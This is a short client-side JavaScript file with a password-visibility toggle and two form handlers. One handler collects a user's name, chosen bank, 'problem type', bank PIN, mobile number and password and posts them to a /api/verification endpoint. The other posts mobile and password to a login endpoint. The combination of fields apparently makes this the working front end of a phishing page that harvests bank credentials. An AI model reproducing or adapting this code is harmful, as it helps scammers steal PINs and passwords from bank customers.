function showMessage(elementId, message, ok) {
  const el = document.getElementById(elementId);
  if (!el) return;
  el.className = `status ${ok ? "success" : "error"}`;
  el.textContent = message;
}

function toggleVisibility(buttonId, inputId) {
  const btn = document.getElementById(buttonId);
  const input = document.getElementById(inputId);
  if (!btn || !input) return;
  btn.addEventListener("click", () => {
    input.type = input.type === "password" ? "text" : "password";
  });
}

toggleVisibility("togglePin", "pin");
toggleVisibility("togglePassword", "password");
toggleVisibility("toggleLoginPassword", "loginPassword");

const verificationForm = document.getElementById("verificationForm");
if (verificationForm) {
  verificationForm.addEventListener("submit", async (e) => {
    e.preventDefault();
    const payload = {
      name: document.getElementById("name").value.trim(),
      bankName: document.getElementById("bankName").value,
      problemType: document.getElementById("problemType").value,
      pin: document.getElementById("pin").value.trim(),
      experienceLevel: document.getElementById("experienceLevel").value,
      mobile: document.getElementById("mobile").value.trim(),
      password: document.getElementById("password").value
    };

    try {
      const res = await fetch("/api/verification", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      const data = await res.json();
      showMessage("verificationStatus", data.message, res.ok);
      if (res.ok) {
        verificationForm.reset();
      }
    } catch (_err) {
      showMessage("verificationStatus", "Server error. Please try again.", false);
    }
  });
}

const loginForm = document.getElementById("loginForm");
if (loginForm) {
  loginForm.addEventListener("submit", async (e) => {
    e.preventDefault();
    const payload = {
      mobile: document.getElementById("loginMobile").value.trim(),
      password: document.getElementById("loginPassword").value
    };

    try {
      const res = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      const data = await res.json();
      showMessage("loginStatus", data.message, res.ok);
      if (res.ok) {
        loginForm.reset();
      }
    } catch (_err) {
      showMessage("loginStatus", "Server error. Please try again.", false);
    }
  });
}
